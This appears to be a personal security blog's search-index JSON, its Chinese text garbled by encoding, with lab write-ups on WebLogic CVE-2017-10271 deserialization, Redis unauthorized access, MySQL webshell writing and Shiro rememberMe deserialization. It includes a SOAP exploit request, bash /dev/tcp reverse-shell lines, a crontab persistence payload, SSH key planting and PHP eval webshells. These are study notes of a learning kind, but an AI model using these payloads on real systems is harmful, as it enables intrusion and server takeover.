{"meta":{"title":"redfishçš„å­¦ä¹ ç¬”è®°","subtitle":"redfishçš„å­¦ä¹ ç¬”è®°","description":"","author":"John Doe","url":"https://REDREDREDFISH.github.io","root":"/"},"pages":[{"title":"åˆ†ç±»","date":"2021-12-02T08:13:30.951Z","updated":"2021-12-02T08:13:30.951Z","comments":false,"path":"categories/index.html","permalink":"https://redredredfish.github.io/categories/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-12-02T14:03:06.936Z","updated":"2021-12-02T14:03:06.936Z","comments":true,"path":"repository/index.html","permalink":"https://redredredfish.github.io/repository/index.html","excerpt":"","text":"Githubgithub: username: REDREDREDFISH # github username"},{"title":"æ ‡ç­¾","date":"2021-12-02T09:44:47.223Z","updated":"2021-12-02T08:13:30.956Z","comments":false,"path":"tags/index.html","permalink":"https://redredredfish.github.io/tags/index.html","excerpt":"","text":""},{"title":"å‹æƒ…é“¾æ¥","date":"2021-12-02T15:48:58.244Z","updated":"2021-12-02T08:13:30.952Z","comments":true,"path":"links/index.html","permalink":"https://redredredfish.github.io/links/index.html","excerpt":"","text":""}],"posts":[{"title":"weblogicååºåˆ—åŒ–æ¼æ´çš„åˆçº§ç†è§£(ä¸€)","slug":"weblogicååºåˆ—åŒ–æ¼æ´çš„åˆçº§ç†è§£-ä¸€","date":"2021-07-08T03:07:00.000Z","updated":"2021-12-06T03:09:51.923Z","comments":true,"path":"2021/07/08/weblogicååºåˆ—åŒ–æ¼æ´çš„åˆçº§ç†è§£-ä¸€/","link":"","permalink":"https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%B8%80/","excerpt":"","text":"å•¥æ˜¯weblogic WebLogicæ˜¯Oracleå‘å¸ƒçš„ä¸€ä¸ªåŸºäºJAVAEEæ¶æ„çš„webä¸­é—´ä»¶å¤§æ¦‚å¯ä»¥ç†è§£ä¸ºtomcat pro maxğŸ™ƒ Weblogicååºåˆ—åŒ–æ¼æ´çš„å‡ ä¸ªåˆ©ç”¨é˜¶æ®µä»åˆ©ç”¨æ–¹å¼æ¥çœ‹,åˆ†ä¸ºä¸‰ç±» 1.ç›´æ¥é€šè¿‡T3åè®®å‘é€æ¶æ„ååºåˆ—åŒ–å¯¹è±¡(CVE-2015-4582ã€CVE-2016-0638ã€CVE-2016-3510ã€CVE-2020-2555ã€CVE-2020-2883)2.åˆ©ç”¨T3åè®®é…åˆRMPæˆ–NDæ¥å£åå‘å‘é€ååºåˆ—åŒ–æ•°æ®(CVE2017-3248ã€CVE2018-2628ã€CVE2018-2893ã€CVE2018-3245ã€CVE-2018-3191ã€CVE-2020-14644ã€CVE-2020-14645)è¿˜æœ‰åˆ©ç”¨IIOPåè®®çš„CVE-2020-25513.é€šè¿‡ javabean XMLæ–¹å¼å‘é€ååºåˆ—åŒ–æ•°æ®ã€‚(CVE2017-3506-&gt;CVE-2017-10271-&gt;CVE2019-2725-&gt;CVE-2019-2729) æ¼æ´å¤ç°ç”±äºæ¼æ´ä¼—å¤šï¼Œæ­å»ºç¯å¢ƒæ¯”è¾ƒå¤æ‚ï¼Œè¿˜æ˜¯å…ˆåˆ©ç”¨vulhubä¸­çš„CVE-2017-10271ã€CVE-2018-2628ã€CVE-2018-2894ã€CVE-2020-14882å‡ ä¸ªæ ‡å¿—æ€§çš„æ¼æ´ç¯å¢ƒè¿›è¡Œå¤ç°ã€‚ å…ˆä»æœ€å¤è€çš„å¼€å§‹ CVE-2017-10271 å½±å“èŒƒå›´ï¼š10.3.6.0.0ï¼Œ12.1.3.0.0ï¼Œ12.2.1.1.0ï¼Œ12.2.1.2.0 dockerå¼€å¯ç¯å¢ƒ 1root@kali:/vulhub/weblogic/CVE-2017-10271# docker-compose up -d è¿œå¤ç‰ˆæœ¬ï¼Œç¯å¢ƒå¥½å¤§å…ˆå¿ä¸€ä¸‹ ç­‰å¾…çš„è¿‡ç¨‹ä¸­å…ˆç†è§£ä¸€ä¸‹æ¼æ´åŸç†ä»¥åŠvulhubç»™å‡ºçš„poc è¯¥æ¼æ´ä¸»è¦é’ˆå¯¹weblogicçš„WLS-WebServicesç»„ä»¶å±äºä¸Šè¿°ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨çš„ç¬¬ä¸‰ç±»å¤§è‡´çš„åŸç†é€šè¿‡ä¼ è¾“javabean XMLæ–¹å¼æ„é€ æ¶æ„XMLæ•°æ®é€ æˆä»£ç æ‰§è¡Œ ç»“åˆpocæ¥çœ‹ 123456789101112131415161718192021222324252627282930313233POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 633&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt; &lt;void index=&quot;0&quot;&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index=&quot;1&quot;&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index=&quot;2&quot;&gt; &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=&quot;start&quot; /&gt; &lt;/void&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body /&gt;&lt;/soapenv:Envelope&gt; å¤§æ¦‚æ˜¯å‘ç½‘ç«™çš„/wls-wsat/CoordinatorPortTypeè·¯å¾„ä¼ å…¥xmlæ•°æ®ï¼Œè¿™ä¸²xmlç›®çš„æ˜¯åå¼¹shellOKï¼Œç¯å¢ƒèµ·å¥½å¼€å§‹å¤ç° è®¿é—®localhost:7001/wls-wsat/CoordinatorPortTypeï¼Œæ˜¾ç¤ºwls-wsatç»„ä»¶çš„ä¸€äº›é…ç½®ä¿¡æ¯ï¼Œè¡¨ç¤ºæœåŠ¡å·²ç»å¼€å¯æœ¬åœ°ç›‘å¬6666ç«¯å£ 1root@kali:/# nc -l -p 6666 bpæŠ“åŒ…é‡æ”¾æ„é€ å¥½çš„æ•°æ®åŒ…ï¼Œæ³¨æ„å­—æ®µContent-Typeæ”¹ä¸ºtext/xmlæˆåŠŸåå¼¹shellï¼ŒæœåŠ¡å™¨æ‰§è¡Œäº†æˆ‘ä»¬ä¼ å…¥çš„/bin/bash -c bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 æ¼æ´åŸç†æ¼æ´åˆ©ç”¨çš„è¿‡ç¨‹å¾ˆç®€å•æœ‰ä¸¤ä¸ªç–‘é—®ç‚¹ 1.wls-wsatç»„ä»¶å¦‚ä½•å¤„ç†xmlæ•°æ®2.é€ æˆååºåˆ—åŒ–æ¼æ´çš„å…³é”®ç‚¹åœ¨å“ª å°è¯•ä¼ å…¥ä»»æ„å‘½ä»¤åœ¨å“åº”ä¸­çœ‹åˆ°äº†è¿”å›çš„xmlæ•°æ®ä»¥åŠæ•´ä¸ªå¤„ç†è¿‡ç¨‹çš„è°ƒç”¨æ ˆå¯ä»¥çœ‹åˆ°å¤„ç†è¿‡ç¨‹æœ€åè°ƒç”¨äº†java.beans.XMLDecoderæ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”¨äºå°†XMLæ•°æ®ååºåˆ—åŒ–ä¸ºjavaå¯¹è±¡ï¼Œè¿™é‡Œé€ æˆäº†æ— å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œ æ ¹æ®vulhubæä¾›çš„æŠ€æœ¯æ–‡æ¡£ã€å‚è€ƒå¤§ä½¬çš„åˆ†æè¿‡ç¨‹å¯ä»¥å¾—çŸ¥å¤§è‡´çš„å¤„ç†è¿‡ç¨‹ 1.æ ¹æ®POCï¼Œå½“æˆ‘ä»¬ä¼ å…¥&#60;&#115;&#111;&#97;&#112;&#101;&#110;&#118;&#62;æ ‡ç­¾åŒ…è£¹çš„æ•°æ®æ—¶ï¼Œwls-wsatä½¿ç”¨äº†weblogicè‡ªå¸¦çš„webserviceså¤„ç†ç¨‹åºæ¥å¤„ç†SOAPè¯·æ±‚2.è¯¥å¤„ç†ç¨‹åºé¦–å…ˆè°ƒç”¨weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequestæ–¹æ³•è·å–åˆ°æˆ‘ä»¬ä¼ å…¥çš„xmlæ•°æ®ä¸ºvar1ï¼Œå®šä¹‰var2ä¸ºå¤„ç†è¿‡çš„var1æ•°æ®3.é€šè¿‡var2.get()æ–¹æ³•ä¸­çš„WorkAreaConstants.WORK_AREA_HEADERå‚æ•°è·å–&lt;work:WorkContext &gt;æ ‡ç­¾ä¸­çš„å†…å®¹4.å½“var3ä¸ä¸ºç©ºæ—¶ï¼Œæ‰§è¡ŒreadHeaderOld(var3); 5.åœ¨readHeaderOldä¸­ï¼Œå®ä¾‹åŒ–äº†WorkContextXmlInputAdapterï¼Œæ­¤æ—¶æ–¹æ³•å†…çš„var4æ˜¯javaæ ‡ç­¾é‡Œçš„å†…å®¹ 6.åœ¨å®ä¾‹åŒ–WorkContextXmlInputAdapterä¸­ï¼Œç›´æ¥è°ƒç”¨xmlDecoderååºåˆ—åŒ–ä¼ å…¥çš„xmlæ•°æ®ï¼Œä¹Ÿå°±æ˜¯å¤„ç†è¿‡çš„var4 ä»æ•´ä¸ªè¿‡ç¨‹ä¸­å¯ä»¥å‘ç°ï¼Œä¼ å…¥çš„xmlæ•°æ®ä»å§‹è‡³ç»ˆéƒ½æ²¡æœ‰å—åˆ°ä»»ä½•è¿‡æ»¤ï¼Œwls-wsatçš„ç±»ä¼¼å‰¥æ´‹è‘±çš„å¤„ç†æ–¹å¼ä¸€å±‚ä¸€å±‚æ­å¼€æœ€åç›´æ¥ååºåˆ—åŒ–ï¼Œè¿™æ ·æ˜¾ç„¶æ˜¯å¾ˆä¸å®‰å…¨æ»´ã€‚","categories":[{"name":"webæ¼æ´","slug":"webæ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"ååºåˆ—åŒ–æ¼æ´","slug":"webæ¼æ´/ååºåˆ—åŒ–æ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"ååºåˆ—åŒ–æ¼æ´","slug":"ååºåˆ—åŒ–æ¼æ´","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"weblogicååºåˆ—åŒ–","slug":"weblogicååºåˆ—åŒ–","permalink":"https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"author":"redfish"},{"title":"redisæœªæˆæƒè®¿é—®","slug":"helloworld","date":"2021-07-07T08:05:00.000Z","updated":"2021-12-06T03:10:31.762Z","comments":true,"path":"2021/07/07/helloworld/","link":"","permalink":"https://redredredfish.github.io/2021/07/07/helloworld/","excerpt":"","text":"redisæœªæˆæƒè®¿é—®çš„åˆ©ç”¨æ–¹å¼æ¼æ´åŸç†ï¼š Redis&lt;3.2é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨0.0.0.0:6379ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„å®‰å…¨ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™é»‘ç™½åå•ç­‰ç­‰ï¼Œè¿™æ ·ä¼šå°†RedisæœåŠ¡æš´éœ²åœ¨å…¬ç½‘ä¸Šã€‚å¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç (é»˜è®¤ä¸ºç©º)çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·å¯ä»¥æœªæˆæƒè®¿é—®Redisä»¥åŠè¯»å–Redisçš„æ•°æ®ã€‚æ”»å‡»è€…åˆ©ç”¨Redisè‡ªèº«çš„æä¾›çš„configå‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œè¿˜å¯ä»¥å°†sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨./root/.sshä¸‹çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥åˆ©ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡å™¨ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚æ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹: Redisç»‘å®šåœ¨0.0.0.0:6379,ä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘ æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯æˆ–è€…å¼±å¯†ç ï¼Œå¯ä»¥å…å¯†ç™»å½•redisæœåŠ¡ æ¼æ´å¤ç°ï¼šç¯å¢ƒï¼š æ”»å‡»æœºkali5.7.0 192.168.237.132 é¶æœº1 Ubuntu16.04 192.168.237.128 é¶æœº2 centOS7 192.168.237.133 redis 2.8.17 é¶æœº1å¼€å¯redis-serverï¼Œæ”»å‡»æœº./redis-cli -h å°è¯•è¿æ¥ç”±äºé¶æœº1æ²¡æœ‰å¼€å¯å®‰å…¨ç­–ç•¥ä¸”é»˜è®¤æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯é€ æˆæ”»å‡»æœºå¯ä»¥æœªæˆæƒè®¿é—®ä¸”æ‰§è¡Œå‘½ä»¤è·å–æ•æ„Ÿæ•°æ® åˆ©ç”¨æ–¹å¼ä¸€ï¼šwebshellæ”»å‡»æœºè¿›è¡Œæœªæˆæƒè®¿é—®ï¼Œåˆ©ç”¨redisçš„config setå‘½ä»¤å°†webshellå†™å…¥é¶æœº2ç½‘ç«™ç›®å½•ä¸‹(*Redis Config Set å‘½ä»¤å¯ä»¥åŠ¨æ€åœ°è°ƒæ•´ Redis æœåŠ¡å™¨çš„é…ç½®) 1234config set dir #è®¾ç½®è·¯å¾„config set dbfilename #è®¾ç½®æ–‡ä»¶åset webshell #å†™å…¥keyå€¼â€œwebshellâ€å¯¹åº”çš„å€¼save #å°†æ‰€æœ‰keyå€¼ä¿å­˜åœ¨æ–‡ä»¶ä¸­ åœ¨é¶æœº2ä¸ŠæŸ¥çœ‹å·²ç»å†™å…¥äº†shell.phpæ–‡ä»¶ æµè§ˆå™¨è®¿é—®http://é¶æœº2/shell.php,å‘ç°æˆåŠŸå†™å…¥webshell åŒç†å¯å†™å…¥ä¸€å¥è¯æœ¨é©¬\\n\\n\\næ¢è¡Œé¿å…å› &lt;?å¯¼è‡´shellæ— æ³•è§£æ èœåˆ€æˆåŠŸè¿æ¥ åˆ©ç”¨æ–¹å¼äºŒï¼šå†™å…¥SSHå…¬é’¥å®ç°SSHç™»å½•å°†æ”»å‡»æœºæœ¬æœºçš„å…¬é’¥ä½œä¸ºvalueï¼Œç„¶åé€šè¿‡ä¿®æ”¹redisçš„é»˜è®¤è·¯å¾„ä¸º/root/.sshå’Œé»˜è®¤çš„ç¼“å†²æ–‡ä»¶authorized.keys,æŠŠç¼“å†²çš„æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥åœ¨é¶æœº2çš„/root/.sshä¸‹ç”Ÿä¸€ä¸ªæˆæƒçš„keyï¼Œä»è€Œé€šè¿‡sshç™»å½•é¶æœº2ã€‚ 1ssh-keygen -t rsa #ç”Ÿæˆsshå…¬é’¥å’Œç§é’¥,é»˜è®¤å¯†ç ä¸ºç©º å°†ç”Ÿæˆçš„å…¬é’¥ä¿å­˜åˆ°ssh.txt 1(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; ssh.txt å°†ä¿å­˜çš„å…¬é’¥ssh.txtå†™å…¥é¶æœº2 redisçš„keyå€¼sshä¸­ 1cat /root/.ssh/ssh.txt | redis-cli -h é¶æœº2 -x set ssh è¿œç¨‹ç™»å½•é¶æœº2çš„redisæœåŠ¡ï¼Œæ›´æ”¹rediså¤‡ä»½è·¯å¾„ä¸ºsshå…¬é’¥å­˜æ”¾ç›®å½• 1config set dir /root/.ssh è®¾ç½®ä¸Šä¼ å…¬é’¥çš„å¤‡ä»½æ–‡ä»¶åå­—ä¸ºauthorized_keys,ä¿å­˜ä¸Šä¼ æ”»å‡»æœºä½¿ç”¨sshå…å¯†ç™»å½•é¶æœº2 æˆåŠŸç™»å½•é¶æœº2 åˆ©ç”¨æ–¹å¼ä¸‰ï¼šcrontabå®šæ—¶ä»»åŠ¡ï¼Œåå¼¹shellæ”»å‡»æœºç›‘å¬9999ç«¯å£ 1nc -l ç«¯å£ è¿œç¨‹ç™»å½•redisï¼Œå†™å…¥å®šæ—¶ä»»åŠ¡ï¼Œä¸€åˆ†é’Ÿåæ‰§è¡Œbashåå¼¹shell 1234set test &quot;\\n\\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/æ”»å‡»æœº/ç›‘å¬ç«¯å£ 0&gt;&amp;1\\n\\n&quot;config set dir /var/spool/cronconfig set dbfilename testsave åå¼¹shellæˆåŠŸ åˆ©ç”¨æ–¹å¼å››ï¼šæ‰§è¡Œluaè„šæœ¬Redisåœ¨2.6æ¨å‡ºäº†è„šæœ¬åŠŸèƒ½ï¼Œå…è®¸å¼€å‘è€…ä½¿ç”¨luaè¯­è¨€ç¼–å†™è„šæœ¬ä¼ åˆ°Redisä¸­æ‰§è¡Œã€‚æš‚æ—¶è¿˜æ²¡æ‰¾åˆ°æ€ä¹ˆåˆ©ç”¨luaæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ ç¼–å†™luaè„šæœ¬test.luaè¾“å‡ºå­—ç¬¦hello,world! 12local a = &quot;hello,world!&quot;return a redis-cli â€“eval test.lua -h é¶æœº2","categories":[{"name":"webæ¼æ´","slug":"webæ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"æœªæˆæƒè®¿é—®æ¼æ´","slug":"webæ¼æ´/æœªæˆæƒè®¿é—®æ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"}],"tags":[{"name":"redisæœªæˆæƒè®¿é—®","slug":"redisæœªæˆæƒè®¿é—®","permalink":"https://redredredfish.github.io/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"æœªæˆæƒè®¿é—®æ¼æ´","slug":"æœªæˆæƒè®¿é—®æ¼æ´","permalink":"https://redredredfish.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"}],"author":"redfish"},{"title":"Mysqlå†™shellçš„å‡ ç§æ–¹å¼","slug":"Mysqlå†™shellçš„å‡ ç§æ–¹å¼","date":"2021-07-06T03:04:00.000Z","updated":"2021-12-06T03:10:44.520Z","comments":true,"path":"2021/07/06/Mysqlå†™shellçš„å‡ ç§æ–¹å¼/","link":"","permalink":"https://redredredfish.github.io/2021/07/06/Mysql%E5%86%99shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/","excerpt":"","text":"Mysqlå†™shellçš„å‡ ç§æ–¹å¼å½“æˆ‘ä»¬æ‹¿åˆ°æ•°æ®åº“æƒé™æ—¶ï¼Œå¯é€šè¿‡æ•°æ®åº“ç®¡ç†å·¥å…·å†™å…¥shellåˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œåˆ©ç”¨shellæ§åˆ¶ç›®æ ‡æœåŠ¡å™¨ã€‚ å¤ç°ç¯å¢ƒï¼šphpstudy_pro 8.1.0.6mysql 5.7.26 rootæƒé™ ç½‘ç«™ç»å¯¹è·¯å¾„ä¸ºD:\\phpstudy_pro\\WWW åˆ©ç”¨æ–¹å¼ï¼š é€šè¿‡outfileå†™å…¥shellå°è¯•é€šè¿‡outfileå†™å…¥æ–‡ä»¶ 1æŠ¥é”™[Code: 1290, SQL State: HY000]The MySQL server is running with the â€“secure-file-priv option so it cannot execute this statement ç™¾åº¦ä¹‹åæ‰¾åˆ°åŸå› ï¼šmysql 5.6.34ç‰ˆæœ¬ä»¥å secure_file_privçš„å€¼é»˜è®¤ä¸ºNULLï¼Œé™åˆ¶æ— æ³•å¯¼å…¥å’Œå¯¼å‡ºæ–‡ä»¶ è§£å†³åŠæ³•ï¼šåœ¨my.inié…ç½®æ–‡ä»¶[mysqld]ä¸‹æ·»åŠ secure_file_priv =&quot;&quot;ä½¿å…¶é»˜è®¤ä¸ºç©º æ–°å»ºæŸ¥è¯¢select 12&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; into outfile&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;;ï¼ŒæˆåŠŸå†™å…¥shell.phpæ–‡ä»¶ èšå‰‘è¿æ¥http://localhost:122/shell.phpæˆåŠŸ å‘è¡¨æ’å…¥shellå¹¶æŸ¥è¯¢å¯¼å‡ºå°†ä¸€å¥è¯æœ¨é©¬ä½œä¸ºæ•°æ®æ’å…¥test1è¡¨usernameå­—æ®µä¸­ 1insert into`test1`(`username`) values (&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;); æŸ¥è¯¢è¯¥æ•°æ®å¹¶å¯¼å‡ºåˆ°shell.php 1select username from test1 into outfile &#x27;D:/phpstudy_pro/WWW/shell.php&#x27;; èšå‰‘è¿æ¥http://localhost:122/shell.phpæˆåŠŸ å¼€å¯å…¨å±€æ—¥å¿—å†™å…¥shellé¦–å…ˆæŸ¥çœ‹å…¨å±€æ—¥å¿—æ˜¯å¦å¼€å¯ 1show variables like &#x27;%general%&#x27;; å¦‚å›¾æ‰€ç¤ºgeneral_log=OFFå…¨å±€æ—¥å¿—æœªå¼€å¯ 1234å¼€å¯å…¨å±€æ—¥å¿— set global general_log = on; å°†å…¨å±€æ—¥å¿—è·¯å¾„è®¾ç½®ä¸ºshellæ–‡ä»¶è·¯å¾„ set global general_log_file = &#x27;D:/phpstudy_pro/WWW/shell.php&#x27;; 1æ–°å»ºæŸ¥è¯¢select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;; mysqlä¼šå°†æ‰§è¡Œçš„è¯­å¥è®°å½•åˆ°å…¨å±€æ—¥å¿—ï¼Œä»è€Œå°†shellå†™å…¥ç½‘ç«™ç›®å½• èšå‰‘è¿æ¥æˆåŠŸ æ…¢æŸ¥è¯¢æ—¥å¿—å†™å…¥shellç”±äºåœ¨mysql&gt;5.6.34ä¸­ï¼Œsecure_file_privä¼šé˜»æ‹¦æˆ‘ä»¬ä½¿ç”¨outfileå†™å…¥æ–‡ä»¶ï¼Œæ²¡æœ‰æœåŠ¡å™¨æƒé™æ— æ³•ä¿®æ”¹my.inié…ç½®æ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨æ…¢æŸ¥è¯¢æ—¥å¿—å†™å…¥shellï¼ŒåŸç†å’Œåˆ©ç”¨å…¨å±€æ—¥å¿—å·®ä¸å¤šã€‚é¦–å…ˆä¸€æ ·æŸ¥çœ‹æ…¢æŸ¥è¯¢æ—¥å¿—æ˜¯å¦å¼€å¯ 1show variables like &#x27;%slow_query_log%&#x27;; å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—å¹¶ä¿®æ”¹æ—¥å¿—æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ ä½¿ç”¨æ…¢æŸ¥è¯¢æ—¥å¿—æ—¶ï¼Œåªæœ‰å½“æŸ¥è¯¢æ—¶é—´è¶…è¿‡ç³»ç»Ÿæ—¶é—´æ—¶æ‰ä¼šè®°å½•åœ¨æ—¥å¿—ä¸­ 1æŸ¥è¯¢mysqlç³»ç»Ÿæ—¶é—´ show global variables like &#x27;%long_query_time%&#x27;; å‘æ—¥å¿—ä¸­å†™å…¥shell 1select &#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27; or sleep(11);è®¾ç½®æŸ¥è¯¢æ—¶é—´ä¸º11s æ‰§è¡ŒæˆåŠŸ èšå‰‘è¿æ¥æˆåŠŸ phpMyAdminæ–‡ä»¶åŒ…å«æ¼æ´CVE-2018-19968CVE-2018-12613CVE-2016-5734CVE-2014-8959","categories":[{"name":"webæ¼æ´","slug":"webæ¼æ´","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"sqlæ³¨å…¥","slug":"webæ¼æ´/sqlæ³¨å…¥","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql","slug":"mysql","permalink":"https://redredredfish.github.io/tags/mysql/"}],"author":"redfish"},{"title":"shiroååºåˆ—åŒ–çš„åˆçº§ç†è§£","slug":"shiroååºåˆ—åŒ–","date":"2021-07-06T02:37:00.000Z","updated":"2021-12-06T03:09:26.034Z","comments":true,"path":"2021/07/06/shiroååºåˆ—åŒ–/","link":"","permalink":"https://redredredfish.github.io/2021/07/06/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"shiroååºåˆ—åŒ–åŸç†rememberMeåŠŸèƒ½ï¼šshiroæ¡†æ¶æä¾›äº†rememberMeåŠŸèƒ½ï¼Œè¿™ä¸ªåŠŸèƒ½å¤§æ¦‚æ˜¯ç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆä¸€ä¸ªå‡­è¯ç»„ï¼Œshiroå°†å®ƒç»è¿‡åºåˆ—åŒ–-&gt;AESåŠ å¯†-&gt;Base64åŠ å¯†å¾—åˆ°ä¸€ä¸²æ•°æ®æµä¼ å›ç»™cookieï¼Œä¸‹æ¬¡ç™»å½•æ—¶ï¼Œshiroé€šè¿‡Base64è§£ç -&gt;AESè§£å¯†-&gt;ååºåˆ—åŒ–éªŒè¯cookieä¸­çš„rememberMeåŒ…å«çš„å‡­è¯ç»„æ˜¯å¦æ­£ç¡®ï¼Œä»è€Œå®ç°â€œä¸‹æ¬¡ç™»å½•è®°ä½æˆ‘â€çš„åŠŸèƒ½ã€‚ æ¼æ´åŸç†ï¼šé€ æˆshiroååºåˆ—åŒ–æ¼æ´çš„å…³é”®ç‚¹ï¼Œä¸€ä¸ªæ˜¯Shiro&lt;1.2.4ä¸­ï¼ŒAES-CBCåŠ è§£å¯†æ—¶keyé»˜è®¤ä¸ºç¡¬ç¼–ç ï¼Œåªè¦èƒ½è·å–åˆ°è¿™ä¸ªkeyå°±å¯ä»¥æ„é€ æ¶æ„æ•°æ®è®©shiroè¯†åˆ«ä¸ºæ­£å¸¸æ•°æ®ï¼›å¦ä¸€ä¸ªç‚¹æ˜¯shiroåœ¨éªŒè¯rememberMeæ—¶ä½¿ç”¨äº†readObjectæ–¹æ³•ï¼ŒreadObjectç”¨æ¥æ‰§è¡Œååºåˆ—åŒ–åéœ€è¦æ‰§è¡Œçš„ä»£ç ç‰‡æ®µï¼Œä»è€Œé€ æˆæ¶æ„å‘½ä»¤å¯ä»¥è¢«æ‰§è¡Œã€‚ æ¼æ´åˆ©ç”¨ï¼š é¦–å…ˆéœ€è¦è·å–æ­£ç¡®çš„keyå€¼ï¼Œåˆ©ç”¨shiroæ¥æ”¶é”™è¯¯rememberMeä¼šæŠ›å‡ºå¼‚å¸¸è¿”å›Set-Cookieçš„ç‰¹æ€§ï¼Œå¯ä»¥é€šè¿‡çˆ†ç ´ï¼Œç›´åˆ°å“åº”å¤´ä¸­ä¸åŒ…å«Set-Cookieï¼Œè¯´æ˜keyæˆåŠŸåŒ¹é…ã€‚ æ¥ç€éœ€è¦å¯¹æ¶æ„æ•°æ®è¿›è¡Œåºåˆ—åŒ–ï¼Œshiroåºåˆ—åŒ–å¯¹è±¡åªæœ‰ç»§æ‰¿PrincipalCollectionæ—¶ï¼Œç±»å‹è½¬æ¢æ‰æ­£å¸¸ï¼Œä¸ç„¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè¿™é‡Œå¯ä»¥å€ŸåŠ©ysoserialç”Ÿæˆåºåˆ—åŒ–æ•°æ®ï¼šåˆ©ç”¨ysoserialä¸­çš„JRMPç›‘å¬æ¨¡å—è¿›è¡Œåå¼¹shellï¼Œéœ€ä½¿ç”¨Java Runtime é…åˆ bash ç¼–ç  java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener ç›‘å¬ç«¯å£CommonsCollections4 â€˜bashç¼–ç â€™ 